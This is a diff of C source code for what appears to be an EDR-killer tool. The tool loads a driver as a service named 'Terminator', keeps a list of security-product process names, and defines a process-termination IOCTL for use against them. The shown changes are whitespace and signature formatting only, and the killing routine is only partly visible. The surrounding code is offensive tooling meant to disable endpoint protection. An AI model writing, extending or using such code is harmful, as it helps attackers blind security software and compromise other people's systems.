@@ -8,8 +8,6 @@
 
 #define IOCTL_TERMINATE_PROCESS 0x80002048
 
-
-
 const char* const edrlist[] = {
     "activeconsole",
     "anti malware",
@@ -117,8 +115,7 @@ int edrlist_size = sizeof(edrlist) / sizeof(edrlist[0]);
 BOOL
 LoadDriver(
     char* driverPath
-)
-{
+){
     SC_HANDLE hSCM, hService;
     const char* serviceName = "Terminator";
 
@@ -204,8 +201,8 @@ LoadDriver(
 
 BOOL
 CheckProcess(
-    DWORD pn)
-{
+    DWORD pn
+){
     DWORD procId = 0;
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
@@ -232,7 +229,10 @@ CheckProcess(
     return (0);
 }
 
-char* to_lowercase(const char* str)
+char* 
+to_lowercase(
+    const char* str
+)
 {
     char* lower_str = _strdup(str);
     for (int i = 0; lower_str[i]; i++)
@@ -242,7 +242,10 @@ char* to_lowercase(const char* str)
     return lower_str;
 }
 
-int is_in_edrlist(const char* pn)
+int 
+is_in_edrlist(
+    const char* pn
+)
 {
     char* tempv = to_lowercase(pn);
     for (int i = 0; i < edrlist_size; i++)
@@ -257,7 +260,11 @@ int is_in_edrlist(const char* pn)
     return (0);
 }
 
-DWORD check_EDR_Processes(HANDLE hDevice) {
+DWORD 
+check_EDR_Processes
+(
+    HANDLE hDevice
+){
     unsigned int procId = 0;
     unsigned int pOutbuff = 0;
     DWORD bytesRet = 0;
